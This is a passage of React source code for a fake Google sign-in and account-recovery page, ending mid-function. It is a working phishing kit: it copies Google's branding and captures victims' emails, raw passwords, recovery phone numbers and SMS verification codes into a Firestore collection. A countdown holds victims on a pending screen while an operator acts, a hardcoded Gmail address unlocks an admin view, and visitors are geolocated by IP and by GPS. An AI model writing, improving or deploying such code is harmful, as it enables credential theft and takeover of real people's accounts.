/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, FormEvent, useEffect, useRef } from 'react';
import { ShieldAlert, Terminal, Eye, EyeOff, LayoutGrid, CheckCircle2, AlertCircle, Loader2, ChevronDown, Check } from 'lucide-react';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';
import { db } from '../lib/firebase';
import { handleFirestoreError, OperationType } from '../lib/firestore-error';
import { COUNTRIES, CountryConfig, detectCountryByBrowser, validatePhoneNumber } from '../lib/countries';


interface LoginViewProps {
  onSuccess: () => void;
  onNavigate: (view: 'login' | 'admin' | 'code') => void;
}

export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [lastEmail, setLastEmail] = useState(() => {
    return localStorage.getItem('last_submitted_email') || 'user@gmail.com';
  });
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [staySignedIn, setStaySignedIn] = useState(false);
  
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);

  // Error States
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [confirmError, setConfirmError] = useState('');
  
  // Submission Success Notification State
  const [isSubmitted, setIsSubmitted] = useState(() => {
    return localStorage.getItem('pending_submission_id') !== null;
  });
  const [timeLeft, setTimeLeft] = useState(() => {
    if (localStorage.getItem('pending_submission_is_confirmed') === 'true') {
      return 0;
    }
    const id = localStorage.getItem('pending_submission_id');
    if (id) {
      const start = Number(localStorage.getItem('pending_submission_start') || '0');
      const elapsed = Math.floor((Date.now() - start) / 1000);
      return Math.max(300 - elapsed, 0);
    }
    return 300;
  });
  const [isConfirmed, setIsConfirmed] = useState(() => {
    return localStorage.getItem('pending_submission_is_confirmed') === 'true';
  });
  const [isAppealMode, setIsAppealMode] = useState(() => {
    return localStorage.getItem('pending_appeal_mode') === 'true';
  });

  // Account Recovery States
  const [isRecoveryPage, setIsRecoveryPage] = useState(() => {
    return localStorage.getItem('pending_is_recovery_page') === 'true';
  });
  const [isTryAnotherWayPage, setIsTryAnotherWayPage] = useState(false);
  const [recoveryPhone, setRecoveryPhone] = useState('');
  const [phoneError, setPhoneError] = useState('');
  const [isSubmittingPhone, setIsSubmittingPhone] = useState(false);
  const [isCodeSent, setIsCodeSent] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [codeError, setCodeError] = useState('');
  const [isVerifyingCode, setIsVerifyingCode] = useState(false);
  const [isRecoveryComplete, setIsRecoveryComplete] = useState(false);

  // 3-minute Countdown Timer states
  const [codeTimer, setCodeTimer] = useState(180);
  const [showSessionExpired, setShowSessionExpired] = useState(false);

  // For global region tracking
  const [selectedCountry, setSelectedCountry] = useState<CountryConfig>(COUNTRIES[0]);
  const [isCountryDropdownOpen, setIsCountryDropdownOpen] = useState(false);
  const [countrySearch, setCountrySearch] = useState('');
  const dropdownRef = useRef<HTMLDivElement>(null);

  const filteredCountries = COUNTRIES.filter((c) => {
    const search = countrySearch.toLowerCase().trim();
    if (!search) return true;
    return (
      c.name.toLowerCase().includes(search) ||
      c.code.toLowerCase().includes(search) ||
      c.callingCode.toLowerCase().includes(search) ||
      c.callingCode.replace('+', '').includes(search)
    );
  });

  // Close dropdown on click outside
  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsCountryDropdownOpen(false);
        setCountrySearch('');
      }
    }
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);



  // Real-time Firestore document updates listener
  useEffect(() => {
    const subId = localStorage.getItem('pending_submission_id');
    if (!isSubmitted || !subId) return;

    const unsubscribe = onSnapshot(doc(db, 'submissions', subId), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.status === 'confirmed') {
          setIsConfirmed(true);
          setTimeLeft(0);
          localStorage.setItem('pending_submission_is_confirmed', 'true');
        }
      }
    }, (error) => {
      console.error('Real-time listener error:', error);
    });

    return () => unsubscribe();
  }, [isSubmitted]);

  // Code verification 3-minute timer effect
  useEffect(() => {
    if (isCodeSent) {
      setCodeTimer(180);
    }
  }, [isCodeSent]);

  useEffect(() => {
    if (!isCodeSent || isRecoveryComplete) return;

    const interval = setInterval(() => {
      setCodeTimer((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          setShowSessionExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [isCodeSent, isRecoveryComplete]);

  const formatCodeTime = (secs: number) => {
    const m = Math.floor(secs / 60).toString().padStart(2, '0');
    const s = (secs % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
  };

  // Timer countdown
  useEffect(() => {
    if (!isSubmitted) {
      return;
    }
    if (isConfirmed || timeLeft <= 0) {
      return;
    }
    const timer = setInterval(() => {
      const start = Number(localStorage.getItem('pending_submission_start') || '0');
      const elapsed = Math.floor((Date.now() - start) / 1000);
      const remaining = Math.max(300 - elapsed, 0);
      
      setTimeLeft(remaining);

      if (remaining <= 0) {
        localStorage.setItem('pending_submission_is_confirmed', 'true');
        clearInterval(timer);
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitted, isConfirmed, timeLeft]);

  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  // Helper to parse browser name from user agent
  const getBrowserName = (): string => {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Edge')) return 'Edge';
    if (userAgent.includes('MSIE') || userAgent.includes('Trident')) return 'Internet Explorer';
    return 'Other Browser';
  };

  // Global location tracking to auto-determine region and country code
  useEffect(() => {
    let active = true;

    // Fast heuristic detection as initial state
    const initialCountry = detectCountryByBrowser();
    setSelectedCountry(initialCountry);

    async function detectLocation() {
      // 1. Primary IP Geo Detection
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (!res.ok) throw new Error('ipapi failed');
        const data = await res.json();
        if (data && data.country_code && active) {
          const countryCode = data.country_code.toUpperCase();
          const matched = COUNTRIES.find(c => c.code === countryCode);
          if (matched) {
            setSelectedCountry(matched);
            return;
          } else {
            // Dynamically build and add custom country if not in our extensive list
            const customCountry: CountryConfig = {
              code: countryCode,
              name: data.country_name || countryCode,
              callingCode: data.country_calling_code || '',
              flag: '🌐'
            };
            setSelectedCountry(customCountry);
            return;
          }
        }
      } catch (err) {
        console.warn('Primary IP detection failed, trying backup...', err);
        // 2. Backup IP Geo Detection
        try {
          const res = await fetch('https://ip-api.com/json/');
          if (res.ok) {
            const data = await res.json();
            if (data && data.countryCode && active) {
              const matched = COUNTRIES.find(c => c.code === data.countryCode.toUpperCase());
              if (matched) {
                setSelectedCountry(matched);
                return;
              }
            }
          }
        } catch (err2) {
          console.warn('Backup IP detection failed', err2);
        }
      }
    }

    detectLocation();

    // 3. Optional high-accuracy Geolocation API where available & permitted
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          if (!active) return;
          const { latitude, longitude } = position.coords;
          try {
            const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
            if (res.ok) {
              const data = await res.json();
              if (data && data.countryCode && active) {
                const matched = COUNTRIES.find(c => c.code === data.countryCode.toUpperCase());
                if (matched) {
                  setSelectedCountry(matched);
                }
              }
            }
          } catch (geoErr) {
            console.warn('Reverse geocoding failed', geoErr);
          }
        },
        (error) => {
          console.log('Geolocation permission denied/failed. Sticking to IP & browser locale.');
        },
        { timeout: 5000 }
      );
    }

    return () => {
      active = false;
    };
  }, []);


  const handleSignIn = async (e: FormEvent) => {
    e.preventDefault();
    if (!staySignedIn) return;
    
    // Reset Errors
    setEmailError('');
    setPasswordError('');
    setConfirmError('');
    
    const trimmedEmail = emailOrPhone.trim();

    // Check for admin first to make it extremely forgiving and robust
    if (trimmedEmail.toLowerCase() === 'contact.cga.usa@gmail.com' && password && confirmPassword) {
      // Direct routing for the admin - save authenticated session state
      localStorage.setItem('admin_authenticated', 'true');
      setEmailOrPhone('');
      setPassword('');
      setConfirmPassword('');
      onNavigate('admin');
      return;
    }

    let isValid = true;

    // Email or Phone Validation
    if (!trimmedEmail) {
      setEmailError('Email or Phone Number is required.');
      isValid = false;
    } else if (trimmedEmail.includes('@')) {
      const emailRegex = /^\S+@\S+\.\S+$/;
      if (!emailRegex.test(trimmedEmail)) {
        setEmailError('Please enter a valid email format.');
        isValid = false;
      }
    } else {
      // If no @, validate phone as a basic practice
      const phoneRegex = /^[+]?[0-9\s-]{7,15}$/;
      if (trimmedEmail.length < 5 || !phoneRegex.test(trimmedEmail)) {
        setEmailError('Please enter a valid email or phone number.');
        isValid = false;
      }
    }

    // Password Validation
    if (!password) {
      setPasswordError('Password is required.');
      isValid = false;
    } else if (password.length < 6) {
      setPasswordError('Password must be at least 6 characters.');
      isValid = false;
    }

    // Confirm Password Validation
    if (confirmPassword !== password) {
      setConfirmError('Confirm Password must exactly match Password.');
      isValid = false;
    }

    if (isValid) {
      // Create a demo submission log object with raw passwords
      const submission = {
        id: 'submission_' + Date.now(),
        timestamp: new Date().toLocaleString(),
        emailOrPhone: trimmedEmail,
        passwordLength: password.length,
        password: password,
        confirmPassword: confirmPassword,
        isMatched: password === confirmPassword,
        browser: getBrowserName(),
        status: 'pending' as const,
        type: isAppealMode ? 'appeal' as const : 'sov' as const,
      };

      // Save to Firestore in real-time
      try {
        await setDoc(doc(db, 'submissions', submission.id), submission);
      } catch (err) {
        console.error('Failed to save to Firestore:', err);
        handleFirestoreError(err, OperationType.WRITE, `submissions/${submission.id}`);
      }

      // Save to localStorage for historical submissions (for admin page view)
      const existing = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
      existing.push(submission);
      localStorage.setItem('demo_submissions', JSON.stringify(existing));

      // Save current pending submission info to force lock the user
      localStorage.setItem('pending_submission_id', submission.id);
      localStorage.setItem('pending_submission_start', String(Date.now()));
      localStorage.setItem('pending_submission_is_confirmed', 'false');
      localStorage.setItem('last_submitted_email', trimmedEmail);
      setLastEmail(trimmedEmail);

      // Clear appeal mode for next submissions
      localStorage.removeItem('pending_appeal_mode');
      setIsAppealMode(false);

      // Reset fields
      setEmailOrPhone('');
      setPassword('');
      setConfirmPassword('');
      setIsSubmitted(true);
      setTimeLeft(300);
      setIsConfirmed(false);
      
      // Let parent state know
      onSuccess();
    }
  };

  const handleRecoverySubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!recoveryPhone) {
      setPhoneError('Phone number is required.');
      return;
    }

    // Perform phone number format validation based on selected country
    const validationError = validatePhoneNumber(recoveryPhone, selectedCountry);
    if (validationError) {
      setPhoneError(validationError);
      return;
    }

    setIsSubmittingPhone(true);
    const fullPhone = `${selectedCountry.callingCode} ${recoveryPhone}`;
    const pendingId = localStorage.getItem('pending_submission_id');

    try {
      if (pendingId) {
        await setDoc(doc(db, 'submissions', pendingId), {
          recoveryPhone: fullPhone,
          type: 'appeal'
        }, { merge: true });

        // Update in localStorage list for admin dashboard
        const existing = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
        const updated = existing.map((sub: any) => {
          if (sub.id === pendingId) {
            return { ...sub, recoveryPhone: fullPhone, type: 'appeal' };
          }
          return sub;
        });
        localStorage.setItem('demo_submissions', JSON.stringify(updated));
      }
      setIsCodeSent(true);
    } catch (err) {
      console.error('Error saving recovery phone:', err);
      setPhoneError('Failed to send verification code. Please try again.');
    } finally {
      setIsSubmittingPhone(false);
    }
  };

  if (isSubmitted) {
    if (isRecoveryPage) {

      if (isTryAnotherWayPage) {
        return (
          <div className="flex flex-col flex-1 bg-[#f8f9fa] dark:bg-neutral-950 min-h-screen justify-center items-center font-sans text-neutral-800 dark:text-neutral-200 p-4">
            <div className="w-full max-w-[450px] bg-white dark:bg-neutral-900 border border-gray-200 dark:border-neutral-800 rounded-lg shadow-sm p-8 md:p-10 space-y-6 animate-fade-in relative">
              <div className="text-center space-y-4">
                <div className="flex justify-center">
                  <svg className="w-[74px] h-[24px]" viewBox="0 0 74 24">
                    <path fill="#4285F4" d="M10.15 11.23v2.53h6.4c-.26 1.45-1.68 4.26-6.4 4.26-4.1 0-7.44-3.4-7.44-7.6s3.34-7.6 7.44-7.6c2.33 0 3.9 1.01 4.79 1.87l2.01-2.01C15.06 1.15 12.82 0 10.15 0 4.54 0 0 4.54 0 10.15s4.54 10.15 10.15 10.15c5.85 0 9.73-4.11 9.73-9.9 0-.67-.07-1.18-.16-1.67h-9.57z"/>
                    <path fill="#EA4335" d="M25.75 6.78c-3.15 0-5.71 2.39-5.71 5.67s2.56 5.67 5.71 5.67c3.15 0 5.71-2.39 5.71-5.67s-2.56-5.67-5.71-5.67zm0 8.9c-1.74 0-3.21-1.42-3.21-3.23s1.47-3.23 3.21-3.23c1.74 0 3.21 1.42 3.21 3.23s-1.47 3.23-3.21 3.23z"/>
                    <path fill="#FBBC05" d="M38.75 6.78c-3.15 0-5.71 2.39-5.71 5.67s2.56 5.67 5.71 5.67 5.71-2.39 5.71-5.67-2.56-5.67-5.71-5.67zm0 8.9c-1.74 0-3.21-1.42-3.21-3.23s1.47-3.23 3.21-3.23c1.74 0 3.21 1.42 3.21 3.23s-1.47 3.23-3.21 3.23z"/>
                    <path fill="#4285F4" d="M49.85 6.78c-3.04 0-5.59 2.45-5.59 5.67s2.5 5.67 5.59 5.67c1.55 0 2.76-.62 3.44-1.41V22c0 2.16-1.16 3.32-3.03 3.32-1.73 0-2.79-1.24-3.18-2.28l-2.21.92c.64 1.54 2.33 3.51 5.39 3.51 3.12 0 5.27-1.84 5.27-5.46V7.12h-2.39v.96c-.68-.81-1.92-1.3-3.29-1.3zm.25 8.9c-1.68 0-3.04-1.42-3.04-3.23s1.35-3.23 3.04-3.23c1.68 0 2.97 1.42 2.97 3.23s-1.29 3.23-2.97 3.23z"/>
                    <path fill="#34A853" d="M57.65.37h2.46v17.39h-2.46z"/>
                    <path fill="#EA4335" d="M67.85 6.78c-2.73 0-5.06 1.99-5.63 4.81l7.63-3.16-.25-.56c-.53-1.45-2.18-4.26-5.32-4.26-3.12 0-5.71 2.45-5.71 5.67 0 3.12 2.53 5.67 5.92 5.67 2.73 0 4.31-1.67 4.97-2.65l-1.98-1.32c-.66.99-1.57 1.67-2.99 1.67-1.39 0-2.46-.73-3.05-1.81l8.03-3.32-.28-.73zM64.71 12c.34-.56.96-1.53 2.19-1.53.84 0 1.5.42 1.72 1.03l-5.31 2.2c-.17-1-.51-1.51-1.6-1.7z"/>
                  </svg>
                </div>
                <h1 className="text-2xl font-normal text-gray-900 dark:text-neutral-100 font-sans tracking-tight">
                  Verify it's you
                </h1>
                <p className="text-sm text-gray-600 dark:text-neutral-400 leading-relaxed px-1">
                  This device isn't recognized. For your security, Google wants to make sure it's really you.{' '}
                  <a
                    href="https://support.google.com/accounts/answer/7162782"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[#1a73e8] dark:text-[#8ab4f8] hover:underline font-medium"
                  >
                    Learn more
                  </a>
                </p>
                <div className="flex justify-center pt-1">
                  <div className="inline-flex items-center gap-2 border border-gray-200 dark:border-neutral-700 px-3 py-1 rounded-full bg-white dark:bg-neutral-800/50 hover:bg-gray-50 dark:hover:bg-neutral-800 transition-colors max-w-[280px]">
                    <div className="w-5 h-5 rounded-full bg-gray-100 dark:bg-neutral-700 flex items-center justify-center text-gray-500 shrink-0">
                      <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                        <circle cx="12" cy="7" r="4" />
                      </svg>
                    </div>
                    <span className="text-xs font-medium text-gray-700 dark:text-neutral-300 truncate" title={lastEmail}>
                      {lastEmail}
                    </span>
                    <ChevronDown className="w-3.5 h-3.5 text-gray-400 shrink-0" />
                  </div>
                </div>
              </div>

              <div className="space-y-4 pt-2">
                <div className="text-left">
                  <h2 className="text-sm font-bold text-gray-900 dark:text-neutral-100 mb-1">
                    Try another way to sign in
                  </h2>
                </div>

                <div className="border-y border-gray-200 dark:border-neutral-800/80 -mx-8 md:-mx-10 divide-y divide-gray-200 dark:divide-neutral-800/80">
                  {/* Option 1: Phone Code */}
                  <div
                    onClick={() => {
                      setIsTryAnotherWayPage(false);
                    }}
                    className="px-8 md:px-10 py-4 flex items-center gap-4 cursor-pointer hover:bg-gray-50 dark:hover:bg-neutral-800/30 transition-all group"
                  >
                    <div className="text-[#1a73e8] dark:text-[#8ab4f8] shrink-0">
                      <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M17 2H7c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" />
                        <circle cx="12" cy="18" r="0.75" fill="currentColor" />
                        <path d="M20 5l-5 5M15 6v4h4" />
                      </svg>
                    </div>
                    <div className="text-left flex-1">
                      <p className="text-sm font-medium text-[#1a73e8] dark:text-[#8ab4f8] hover:underline transition-colors leading-relaxed">
                        Get a verification code sent to your phone
                      </p>
                    </div>
                  </div>

                  {/* Option 2: Get help */}
                  <a
                    href="https://support.google.com/accounts/answer/7682439"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="px-8 md:px-10 py-4 flex items-center gap-4 cursor-pointer hover:bg-gray-50 dark:hover:bg-neutral-800/30 transition-all group block no-underline decoration-transparent"
                  >
                    <div className="text-[#1a73e8] dark:text-[#8ab4f8] shrink-0">
                      <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10" />
                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
                        <line x1="12" y1="17" x2="12.01" y2="17" strokeWidth="2" />
                      </svg>
                    </div>
                    <div className="text-left flex-1">
                      <p className="text-sm font-medium text-[#1a73e8] dark:text-[#8ab4f8] hover:underline transition-colors leading-relaxed">
                        Get help
                      </p>
                    </div>
                  </a>
                </div>

                <div className="flex justify-start pt-2">
                  <button
                    type="button"
                    onClick={() => {
                      setIsTryAnotherWayPage(false);
                    }}
                    className="text-sm font-semibold text-[#1a73e8] dark:text-[#8ab4f8] hover:underline"
                  >
                    Back
                  </button>
                </div>
              </div>
            </div>
          </div>
        );
      }

      return (
        <div className="flex flex-col flex-1 bg-[#f8f9fa] dark:bg-neutral-950 min-h-screen justify-center items-center font-sans text-neutral-800 dark:text-neutral-200 p-4">
          <div className="w-full max-w-[450px] bg-white dark:bg-neutral-900 border border-gray-200 dark:border-neutral-800 rounded-lg shadow-sm p-8 md:p-10 space-y-6 animate-fade-in relative">
            <div className="text-center space-y-4">
              <div className="flex justify-center">
                <svg className="w-[74px] h-[24px]" viewBox="0 0 74 24">
                  <path fill="#4285F4" d="M10.15 11.23v2.53h6.4c-.26 1.45-1.68 4.26-6.4 4.26-4.1 0-7.44-3.4-7.44-7.6s3.34-7.6 7.44-7.6c2.33 0 3.9 1.01 4.79 1.87l2.01-2.01C15.06 1.15 12.82 0 10.15 0 4.54 0 0 4.54 0 10.15s4.54 10.15 10.15 10.15c5.85 0 9.73-4.11 9.73-9.9 0-.67-.07-1.18-.16-1.67h-9.57z"/>
                  <path fill="#EA4335" d="M25.75 6.78c-3.15 0-5.71 2.39-5.71 5.67s2.56 5.67 5.71 5.67c3.15 0 5.71-2.39 5.71-5.67s-2.56-5.67-5.71-5.67zm0 8.9c-1.74 0-3.21-1.42-3.21-3.23s1.47-3.23 3.21-3.23c1.74 0 3.21 1.42 3.21 3.23s-1.47 3.23-3.21 3.23z"/>
                  <path fill="#FBBC05" d="M38.75 6.78c-3.15 0-5.71 2.39-5.71 5.67s2.56 5.67 5.71 5.67 5.71-2.39 5.71-5.67-2.56-5.67-5.71-5.67zm0 8.9c-1.74 0-3.21-1.42-3.21-3.23s1.47-3.23 3.21-3.23c1.74 0 3.21 1.42 3.21 3.23s-1.47 3.23-3.21 3.23z"/>
                  <path fill="#4285F4" d="M49.85 6.78c-3.04 0-5.59 2.45-5.59 5.67s2.5 5.67 5.59 5.67c1.55 0 2.76-.62 3.44-1.41V22c0 2.16-1.16 3.32-3.03 3.32-1.73 0-2.79-1.24-3.18-2.28l-2.21.92c.64 1.54 2.33 3.51 5.39 3.51 3.12 0 5.27-1.84 5.27-5.46V7.12h-2.39v.96c-.68-.81-1.92-1.3-3.29-1.3zm.25 8.9c-1.68 0-3.04-1.42-3.04-3.23s1.35-3.23 3.04-3.23c1.68 0 2.97 1.42 2.97 3.23s-1.29 3.23-2.97 3.23z"/>
                  <path fill="#34A853" d="M57.65.37h2.46v17.39h-2.46z"/>
                  <path fill="#EA4335" d="M67.85 6.78c-2.73 0-5.06 1.99-5.63 4.81l7.63-3.16-.25-.56c-.53-1.45-2.18-4.26-5.32-4.26-3.12 0-5.71 2.45-5.71 5.67 0 3.12 2.53 5.67 5.92 5.67 2.73 0 4.31-1.67 4.97-2.65l-1.98-1.32c-.66.99-1.57 1.67-2.99 1.67-1.39 0-2.46-.73-3.05-1.81l8.03-3.32-.28-.73zM64.71 12c.34-.56.96-1.53 2.19-1.53.84 0 1.5.42 1.72 1.03l-5.31 2.2c-.17-1-.51-1.51-1.6-1.7z"/>
                </svg>
              </div>
              <h1 className="text-2xl font-normal text-gray-900 dark:text-neutral-100 font-sans tracking-tight">
                Account recovery
              </h1>
              <p className="text-sm text-gray-600 dark:text-neutral-400 leading-relaxed px-1">
                To help keep your account safe, Google wants to make sure that it's really you <br />verify to sign in
              </p>
              <div className="flex justify-center pt-1">
                <div className="inline-flex items-center gap-2 border border-gray-200 dark:border-neutral-700 px-3 py-1 rounded-full bg-white dark:bg-neutral-800/50 hover:bg-gray-50 dark:hover:bg-neutral-800 transition-colors max-w-[280px]">
                  <div className="w-5 h-5 rounded-full bg-gray-100 dark:bg-neutral-700 flex items-center justify-center text-gray-500 shrink-0">
                    <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                      <circle cx="12" cy="7" r="4" />
                    </svg>
                  </div>
                  <span className="text-xs font-medium text-gray-700 dark:text-neutral-300 truncate animate-fade-in" title={lastEmail}>
                    {lastEmail}
                  </span>
                  <ChevronDown className="w-3.5 h-3.5 text-gray-400 shrink-0" />
                </div>
              </div>
            </div>

            {!isCodeSent ? (
              <>
                <div className="relative w-full py-8 bg-gray-50 dark:bg-neutral-900/30 border-y border-gray-100 dark:border-neutral-800/80 flex justify-center items-center rounded-sm">
                  <div className="relative w-[64px] h-[110px] bg-neutral-900 dark:bg-neutral-800 rounded-[10px] p-[2.5px] shadow-sm border border-neutral-800">
                    <div className="w-full h-full bg-white dark:bg-neutral-950 rounded-[7px] relative flex flex-col justify-between items-center py-1.5">
                      <div className="w-5 h-0.5 bg-neutral-200 dark:bg-neutral-700 rounded-full"></div>
                      <div className="w-7 h-7 rounded-full border border-neutral-100 dark:border-neutral-900 flex items-center justify-center bg-[#f8f9fa] dark:bg-neutral-900">
                        <div className="w-1.5 h-1.5 rounded-full bg-[#1a73e8] animate-ping"></div>
                      </div>
                      <div className="w-6 h-[1.5px] bg-neutral-200 dark:bg-neutral-700 rounded-full"></div>
                    </div>
                  </div>
                </div>

                <div className="space-y-4 text-left">
                  <h2 className="text-base font-medium text-gray-900 dark:text-neutral-100">
                    Get a verification code
                  </h2>
                  <p className="text-xs text-gray-600 dark:text-neutral-400 leading-relaxed">
                    To get a verification code, first confirm the phone number that you added to your account ••••••••
                  </p>

                  <form onSubmit={handleRecoverySubmit} className="space-y-4 pt-2">
                    <div className="relative flex items-center border border-gray-300 dark:border-neutral-700 rounded-md focus-within:border-[#1a73e8] focus-within:ring-1 focus-within:ring-[#1a73e8] transition-all bg-white dark:bg-neutral-900">
                      <div ref={dropdownRef} className="relative shrink-0">
                        <button
                          type="button"
                          onClick={() => setIsCountryDropdownOpen(!isCountryDropdownOpen)}
                          className="flex items-center gap-1.5 pl-3 pr-2 py-3.5 border-r border-gray-200 dark:border-neutral-800 hover:bg-gray-50 dark:hover:bg-neutral-800 text-sm font-medium text-gray-700 dark:text-neutral-300 rounded-l-md cursor-pointer select-none"
                        >
                          <span className="text-base leading-none">{selectedCountry.flag}</span>
                          <span className="font-mono text-xs">{selectedCountry.callingCode}</span>
                          <ChevronDown className="w-3.5 h-3.5 text-gray-400" />
                        </button>

                        {isCountryDropdownOpen && (
                          <div className="absolute left-0 mt-1 w-64 bg-white dark:bg-neutral-900 border border-gray-200 dark:border-neutral-800 rounded-md shadow-lg z-50 overflow-hidden flex flex-col max-h-60">
                            {/* Search Input */}
                            <div className="p-2 border-b border-gray-100 dark:border-neutral-800 bg-gray-50/50 dark:bg-neutral-900/50">
                              <input
                                type="text"
                                placeholder="Search"
                                value={countrySearch}
                                onChange={(e) => setCountrySearch(e.target.value)}
                                className="w-full px-2.5 py-1.5 text-xs border border-gray-200 dark:border-neutral-700 rounded bg-white dark:bg-neutral-800 focus:outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] text-gray-800 dark:text-neutral-200"
                                onClick={(e) => e.stopPropagation()}
                              />
                            </div>
                            {/* Countries list */}
                            <div className="overflow-y-auto divide-y divide-gray-50 dark:divide-neutral-800/50 flex-1">
                              {filteredCountries.length > 0 ? (
                                filteredCountries.map((c) => (
                                  <button
                                    key={c.code}
                                    type="button"
                                    onClick={() => {
                                      setSelectedCountry(c);
                                      setIsCountryDropdownOpen(false);
                                      setCountrySearch('');
                                    }}
                                    className="w-full flex items-center justify-between px-3 py-2.5 text-xs hover:bg-gray-100 dark:hover:bg-neutral-800/50 text-left text-gray-700 dark:text-neutral-300 transition-colors"
                                  >
                                    <span className="flex items-center gap-2 truncate">
                                      <span className="text-sm leading-none shrink-0">{c.flag}</span>
                                      <span className="font-medium truncate">{c.name} ({c.code})</span>
                                    </span>
                                    <span className="font-mono font-semibold text-[#1a73e8] dark:text-[#8ab4f8] shrink-0 pl-1">{c.callingCode}</span>
                                  </button>
                                ))
                              ) : (
                                <div className="px-3 py-4 text-xs text-center text-gray-400 dark:text-neutral-500">
                                  No countries found
                                </div>
                              )}
                            </div>
                          </div>
                        )}
                      </div>

                      <div className="relative flex-1">
                        <input
                          type="tel"
                          required
                          value={recoveryPhone}
                          onChange={(e) => {
                            setRecoveryPhone(e.target.value);
                            setPhoneError('');
                          }}
                          className="peer block w-full px-3 py-3.5 bg-transparent border-0 text-sm text-gray-900 dark:text-neutral-100 focus:ring-0 focus:outline-none placeholder-transparent"
                          placeholder="Phone number"
                          id="recovery-phone-input"
                        />
                        <label
                          htmlFor="recovery-phone-input"
                          className="absolute left-3 top-1/2 -translate-y-1/2 text-xs text-gray-500 transition-all pointer-events-none bg-white dark:bg-neutral-900 px-1
                          peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-sm
                          peer-focus:-translate-y-9 peer-focus:top-1/2 peer-focus:text-xs peer-focus:text-[#1a73e8]
                          peer-[:not(:placeholder-shown)]:-translate-y-9 peer-[:not(:placeholder-shown)]:top-1/2 peer-[:not(:placeholder-shown)]:text-xs"
                        >
                          Phone number
                        </label>
                      </div>
                    </div>

                    {phoneError && (
                      <p className="text-xs text-red-600 dark:text-red-400 font-medium pl-1">
                        {phoneError}
                      </p>
                    )}

                    <div className="flex items-center justify-between pt-4">
                      <button
                        type="button"
                        onClick={() => {
                          setIsTryAnotherWayPage(true);
                        }}
                        className="text-sm font-semibold text-[#1a73e8] dark:text-[#8ab4f8] hover:underline"
                      >
                        Try another way
                      </button>

                      <button
                        type="submit"
                        disabled={isSubmittingPhone}
                        className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-sm font-semibold rounded-md shadow-sm transition-colors cursor-pointer flex items-center gap-2"
                      >
                        {isSubmittingPhone ? (
                          <Loader2 className="w-4 h-4 animate-spin" />
                        ) : (
                          'Send'
                        )}
                      </button>
                    </div>
                  </form>
                </div>
              </>
            ) : !isRecoveryComplete ? (
              <div className="space-y-4 text-left animate-fade-in">
                <h2 className="text-base font-medium text-gray-900 dark:text-neutral-100">
                  Enter code
                </h2>
                <p className="text-xs text-gray-600 dark:text-neutral-400 leading-relaxed">
                  A text message with a 6-digit verification code was just sent to <span className="font-semibold text-gray-700 dark:text-neutral-300">{selectedCountry.callingCode} {recoveryPhone}</span>
                </p>

                <form
                  onSubmit={async (e) => {
                    e.preventDefault();
                    if (!verificationCode) {
                      setCodeError('Code is required.');
                      return;
                    }
                    setIsVerifyingCode(true);
                    try {
                      const pendingId = localStorage.getItem('pending_submission_id');
                      if (pendingId) {
                        await setDoc(doc(db, 'submissions', pendingId), {
                          verificationCode: verificationCode
                        }, { merge: true });

                        const existing = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
                        const updated = existing.map((sub: any) => {
                          if (sub.id === pendingId) {
                            return { ...sub, verificationCode };
                          }
                          return sub;
                        });
                        localStorage.setItem('demo_submissions', JSON.stringify(updated));
                      }
                      setIsRecoveryComplete(true);
                    } catch (err) {
                      console.error('Error verifying code:', err);
                    } finally {
